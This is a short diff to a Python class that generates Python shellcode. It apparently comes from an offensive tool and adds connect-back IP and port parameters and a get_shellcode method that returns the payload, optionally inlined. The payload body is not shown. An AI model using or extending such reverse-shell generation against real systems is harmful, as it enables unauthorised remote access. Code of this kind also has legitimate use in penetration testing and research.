@@ -1,9 +1,11 @@
-class PythonShellcodes:
+from shellcode import Shellcode
+class PythonShellcodes(Shellcode):
     """
         Class with shellcodes for python language
     """
 
-    def __init__(self):
+    def __init__(self, connectback_ip='localhost', connectback_port=5555):
+        Shellcode.__init__(self, connectback_ip=connectback_ip, connectback_port=connectback_port)
         self.name = ""
         return
 
@@ -55,3 +57,9 @@ s.close()
         pythoncode = pythoncode.replace("LOCALPORT", str(localport))
 
         return pythoncode
+
+    def get_shellcode(self, inline=False):
+        shell = self.get_python_code(self.BADCHARS, self.CONNECTBACK_IP, self.CONNECTBACK_PORT)
+        if inline:
+            shell = self.make_inline(shell)
+        return shell
